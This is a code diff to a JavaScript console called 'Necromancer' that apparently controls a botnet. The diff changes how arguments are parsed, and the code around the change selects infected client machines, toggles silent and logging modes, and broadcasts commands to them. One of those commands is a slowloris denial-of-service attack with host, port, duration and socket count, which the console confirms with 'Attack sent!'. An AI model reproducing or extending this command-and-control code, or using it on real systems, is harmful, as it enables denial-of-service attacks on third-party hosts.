@@ -12,38 +12,32 @@ let fileNum = 0;
 export function prompt() {
 	rl.question(`\x1b[31m[Necromancer]\x1b[0m `, (message) => {
 		message = message.toLowerCase();
-
-		const args = {
-			first: message.split(" ")[1],
-			second: message.split(" ")[2],
-			third: message.split(" ")[3],
-			fourth: message.split(" ")[4],
-		};
+		const arg = message.split(" ");
 
 		if (message.startsWith("instances")) {
 			if (message === "instances") {
 				console.log(
 					`Instances: ${clientModules.clientInstances.length}`
 				);
-			} else if (args.first <= clientModules.clients.length) {
+			} else if (arg[1] <= clientModules.clients.length) {
 				clientModules.clientInstances = [...clientModules.clients];
 				clientModules.clientInstances =
-					clientModules.clientInstances.slice(0, args.first);
-			} else if (args.first === "all")
+					clientModules.clientInstances.slice(0, arg[1]);
+			} else if (arg[1] === "all")
 				clientModules.clientInstances = [...clientModules.clients];
 		}
 
 		if (message.startsWith("select")) {
 			clientModules.clientInstances = [...clientModules.clients];
 			clientModules.clientInstances = Array(
-				clientModules.clientInstances[args.first]
+				clientModules.clientInstances[arg[1]]
 			).filter((i) => i !== undefined);
 		}
 
 		if (message.startsWith("silent")) {
 			if (message === "silent")
 				console.log(`silent: ${clientModules.silent}`);
-			else if (args.first === "true") {
+			else if (arg[1] === "true") {
 				clientModules.silent = true;
 			} else {
 				clientModules.silent = false;
@@ -53,7 +47,7 @@ export function prompt() {
 		if (message.startsWith("logging")) {
 			if (message === "logging")
 				console.log(`logging: ${clientModules.logging}`);
-			else if (args.first === "true") {
+			else if (arg[1] === "true") {
 				clientModules.logging = true;
 				clientModules.silent = true;
 			} else {
@@ -76,7 +70,7 @@ export function prompt() {
 					"You can only use this command on one machine at a time"
 				);
 				return prompt();
-			} else if (args.first !== undefined) {
+			} else if (arg[1] !== undefined) {
 				if (clientModules.logging) {
 					fileNum++;
 					broadcast(message);
@@ -89,7 +83,7 @@ export function prompt() {
 				console.log(
 					"Please provide arguments: slowloris (host) (port) (duration ms) (sockets)"
 				);
-			else if (args.first !== undefined) {
+			else if (arg[1] !== undefined) {
 				broadcast(message);
 				console.log(`Attack sent!`);
 			}
